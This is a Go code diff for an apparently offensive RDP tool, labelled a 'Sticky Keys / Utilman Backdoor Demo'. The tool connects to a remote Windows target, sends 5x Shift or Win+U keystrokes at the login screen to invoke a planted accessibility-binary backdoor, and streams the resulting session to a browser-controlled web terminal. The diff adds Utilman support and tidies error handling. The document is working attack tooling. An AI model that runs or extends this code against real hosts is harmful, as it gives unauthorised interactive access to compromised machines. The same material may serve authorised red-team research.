@@ -64,12 +64,65 @@ func openBrowser(url string) {
 	_ = cmd.Start()
 }
 
+// keyEvent represents a single keyboard event (press or release).
+type keyEvent struct {
+	scancode uint16
+	pressed  bool
+}
+
+// sendKeySequence sends a sequence of key events with 50ms spacing between each event.
+func sendKeySequence(sess interface {
+	SendKey(uint16, bool) error
+}, events ...keyEvent) error {
+	for i, evt := range events {
+		if err := sess.SendKey(evt.scancode, evt.pressed); err != nil {
+			action := "release"
+			if evt.pressed {
+				action = "press"
+			}
+			return fmt.Errorf("key %s: %w", action, err)
+		}
+		// Add delay between key events (except after the last one)
+		if i < len(events)-1 {
+			time.Sleep(50 * time.Millisecond)
+		}
+	}
+	return nil
+}
+
+// triggerBackdoor sends the backdoor-specific key sequence on the given session.
+func triggerBackdoor(sess interface {
+	SendKey(uint16, bool) error
+}, kind BackdoorType) error {
+	switch kind {
+	case BackdoorUtilman:
+		// Win+U sequence
+		return sendKeySequence(sess,
+			keyEvent{leftWinScancode, true},
+			keyEvent{uKeyScancode, true},
+			keyEvent{uKeyScancode, false},
+			keyEvent{leftWinScancode, false},
+		)
+	default: // BackdoorStickyKeys
+		// 5x Shift sequence
+		var events []keyEvent
+		for i := 0; i < 5; i++ {
+			events = append(events,
+				keyEvent{leftShiftScancode, true},
+				keyEvent{leftShiftScancode, false},
+			)
+		}
+		return sendKeySequence(sess, events...)
+	}
+}
+
 // sessionManager holds the active RDP session and allows reconnection.
 type sessionManager struct {
-	mu      sync.RWMutex
-	sess    *InteractiveSession
-	target  string
-	timeout time.Duration
+	mu           sync.RWMutex
+	sess         *InteractiveSession
+	target       string
+	timeout      time.Duration
+	backdoorType BackdoorType
 }
 
 // Session returns the current active session.
@@ -79,7 +132,7 @@ func (m *sessionManager) Session() *InteractiveSession {
 	return m.sess
 }
 
-// Reconnect closes the old session and creates a new one with sticky keys.
+// Reconnect closes the old session and creates a new one, triggering the configured backdoor.
 func (m *sessionManager) Reconnect(ctx context.Context) error {
 	m.mu.Lock()
 	defer m.mu.Unlock()
@@ -105,18 +158,10 @@ func (m *sessionManager) Reconnect(ctx context.Context) error {
 	time.Sleep(3 * time.Second)
 	newSess.WaitForFrame(2 * time.Second)
 
-	// Trigger sticky keys (5x Shift)
-	for i := 0; i < 5; i++ {
-		if sendErr := newSess.SendKey(leftShiftScancode, true); sendErr != nil {
-			newSess.Close()
-			return fmt.Errorf("shift press: %w", sendErr)
-		}
-		time.Sleep(50 * time.Millisecond)
-		if sendErr := newSess.SendKey(leftShiftScancode, false); sendErr != nil {
-			newSess.Close()
-			return fmt.Errorf("shift release: %w", sendErr)
-		}
-		time.Sleep(50 * time.Millisecond)
+	// Trigger the appropriate backdoor
+	if triggerErr := triggerBackdoor(newSess, m.backdoorType); triggerErr != nil {
+		newSess.Close()
+		return fmt.Errorf("trigger backdoor: %w", triggerErr)
 	}
 
 	time.Sleep(1 * time.Second)
@@ -135,10 +180,18 @@ func (m *sessionManager) Close() {
 	}
 }
 
-// RunWebTerminal connects to an RDP target via sticky keys and serves an
+// BackdoorType indicates which backdoor to trigger in web terminal mode.
+type BackdoorType string
+
+const (
+	BackdoorStickyKeys BackdoorType = "stickykeys"
+	BackdoorUtilman    BackdoorType = "utilman"
+)
+
+// RunWebTerminal connects to an RDP target via sticky keys or utilman and serves an
 // interactive web terminal on localhost. Opens a browser-controllable RDP
 // session with live screen streaming, keyboard, and mouse input.
-func RunWebTerminal(ctx context.Context, target string, timeout time.Duration, openInBrowser bool) error {
+func RunWebTerminal(ctx context.Context, target string, timeout time.Duration, openInBrowser bool, backdoorType BackdoorType) error {
 	fmt.Fprintf(os.Stderr, "[*] Connecting to %s for interactive web terminal...\n", target)
 
 	sess, err := NewInteractiveSession(ctx, target, timeout, 1024, 768)
@@ -147,9 +200,10 @@ func RunWebTerminal(ctx context.Context, target string, timeout time.Duration, o
 	}
 
 	mgr := &sessionManager{
-		sess:    sess,
-		target:  target,
-		timeout: timeout,
+		sess:         sess,
+		target:       target,
+		timeout:      timeout,
+		backdoorType: backdoorType,
 	}
 	defer mgr.Close()
 
@@ -158,17 +212,15 @@ func RunWebTerminal(ctx context.Context, target string, timeout time.Duration, o
 	time.Sleep(3 * time.Second)
 	sess.WaitForFrame(2 * time.Second)
 
-	// Trigger sticky keys
-	fmt.Fprintf(os.Stderr, "[*] Sending 5x Shift to trigger sticky keys...\n")
-	for i := 0; i < 5; i++ {
-		if sendErr := sess.SendKey(leftShiftScancode, true); sendErr != nil {
-			return fmt.Errorf("shift press: %w", sendErr)
-		}
-		time.Sleep(50 * time.Millisecond)
-		if sendErr := sess.SendKey(leftShiftScancode, false); sendErr != nil {
-			return fmt.Errorf("shift release: %w", sendErr)
-		}
-		time.Sleep(50 * time.Millisecond)
+	// Trigger the appropriate backdoor
+	if backdoorType == BackdoorUtilman {
+		fmt.Fprintf(os.Stderr, "[*] Sending Win+U to trigger utilman...\n")
+	} else {
+		fmt.Fprintf(os.Stderr, "[*] Sending 5x Shift to trigger sticky keys...\n")
+	}
+
+	if triggerErr := triggerBackdoor(sess, backdoorType); triggerErr != nil {
+		return fmt.Errorf("trigger backdoor: %w", triggerErr)
 	}
 
 	time.Sleep(1 * time.Second)
@@ -190,7 +242,7 @@ func RunWebTerminal(ctx context.Context, target string, timeout time.Duration, o
 	}
 	tcpAddr, ok := listener.Addr().(*net.TCPAddr)
 	if !ok {
-		listener.Close()
+		_ = listener.Close()
 		return fmt.Errorf("unexpected listener address type")
 	}
 	port := tcpAddr.Port
@@ -215,12 +267,14 @@ func RunWebTerminal(ctx context.Context, target string, timeout time.Duration, o
 			height = curSess.Height()
 		}
 		w.Header().Set("Content-Type", "application/json")
-		_ = json.NewEncoder(w).Encode(map[string]interface{}{
+		if err := json.NewEncoder(w).Encode(map[string]interface{}{
 			"width":  width,
 			"height": height,
 			"target": target,
 			"token":  token,
-		})
+		}); err != nil {
+			fmt.Fprintf(os.Stderr, "[!] Failed to encode /info response: %v\n", err)
+		}
 	})
 	mux.HandleFunc("/reconnect", func(w http.ResponseWriter, r *http.Request) {
 		if r.Method != http.MethodPost {
@@ -236,26 +290,38 @@ func RunWebTerminal(ctx context.Context, target string, timeout time.Duration, o
 		if reconnErr := mgr.Reconnect(ctx); reconnErr != nil {
 			w.Header().Set("Content-Type", "application/json")
 			w.WriteHeader(http.StatusInternalServerError)
-			_ = json.NewEncoder(w).Encode(map[string]string{"error": reconnErr.Error()})
+			if err := json.NewEncoder(w).Encode(map[string]string{"error": reconnErr.Error()}); err != nil {
+				fmt.Fprintf(os.Stderr, "[!] Failed to encode error response: %v\n", err)
+			}
 			fmt.Fprintf(os.Stderr, "[!] Reconnect failed: %v\n", reconnErr)
 			return
 		}
 		fmt.Fprintf(os.Stderr, "[+] Reconnected successfully.\n")
 		w.Header().Set("Content-Type", "application/json")
-		_ = json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
+		if err := json.NewEncoder(w).Encode(map[string]string{"status": "ok"}); err != nil {
+			fmt.Fprintf(os.Stderr, "[!] Failed to encode success response: %v\n", err)
+		}
 	})
 	server := &http.Server{Handler: mux}
 
 	// Shut down server when context is canceled
 	go func() {
 		<-ctx.Done()
-		server.Close()
+		_ = server.Close()
 	}()
 
 	url := fmt.Sprintf("http://127.0.0.1:%d", port)
+
+	// Set banner label based on active backdoor type
+	backdoorLabel := "Sticky Keys"
+	if backdoorType == BackdoorUtilman {
+		backdoorLabel = "Utilman"
+	}
+	bannerTitle := fmt.Sprintf("RDP Web Terminal - %s Backdoor Demo", backdoorLabel)
+
 	fmt.Fprintf(os.Stderr, "\n")
 	fmt.Fprintf(os.Stderr, "  ╔══════════════════════════════════════════════════╗\n")
-	fmt.Fprintf(os.Stderr, "  ║  RDP Web Terminal - Sticky Keys Backdoor Demo   ║\n")
+	fmt.Fprintf(os.Stderr, "  ║  %-48s ║\n", bannerTitle)
 	fmt.Fprintf(os.Stderr, "  ╠══════════════════════════════════════════════════╣\n")
 	fmt.Fprintf(os.Stderr, "  ║  Target: %-39s ║\n", target)
 	fmt.Fprintf(os.Stderr, "  ║  URL:    %-39s ║\n", url)
@@ -277,7 +343,7 @@ func handleWebSocket(w http.ResponseWriter, r *http.Request, mgr *sessionManager
 	if wsErr != nil {
 		return
 	}
-	defer conn.Close()
+	defer func() { _ = conn.Close() }()
 
 	ctx, cancel := context.WithCancel(r.Context())
 	defer cancel()
@@ -352,10 +418,9 @@ func handleWebSocket(w http.ResponseWriter, r *http.Request, mgr *sessionManager
 func streamFrames(ctx context.Context, cancel context.CancelFunc, conn net.Conn, mu *sync.Mutex, mgr *sessionManager) {
 	// Recover from panics caused by accessing a closed/freed session during reconnect.
 	defer func() {
-		if r := recover(); r != nil {
-			// Session was closed during reconnect — not a fatal error.
-			// The browser will reconnect with a new WebSocket after /reconnect succeeds.
-		}
+		// Session may be closed during reconnect — not a fatal error.
+		// The browser will reconnect with a new WebSocket after /reconnect succeeds.
+		_ = recover()
 	}()
 
 	ticker := time.NewTicker(100 * time.Millisecond) // ~10 FPS
@@ -466,11 +531,11 @@ func upgradeWebSocket(w http.ResponseWriter, r *http.Request) (net.Conn, error) 
 		"Connection: Upgrade\r\n" +
 		"Sec-WebSocket-Accept: " + accept + "\r\n\r\n"
 	if _, err := bufrw.WriteString(resp); err != nil {
-		conn.Close()
+		_ = conn.Close()
 		return nil, err
 	}
 	if err := bufrw.Flush(); err != nil {
-		conn.Close()
+		_ = conn.Close()
 		return nil, err
 	}
 
@@ -499,13 +564,14 @@ func readWSMessage(conn net.Conn) ([]byte, error) {
 	masked := header[1]&0x80 != 0
 	payloadLen := uint64(header[1] & 0x7F)
 
-	if payloadLen == 126 {
+	switch payloadLen {
+	case 126:
 		ext := make([]byte, 2)
 		if err := readFull(conn, ext); err != nil {
 			return nil, err
 		}
 		payloadLen = uint64(ext[0])<<8 | uint64(ext[1])
-	} else if payloadLen == 127 {
+	case 127:
 		ext := make([]byte, 8)
 		if err := readFull(conn, ext); err != nil {
 			return nil, err
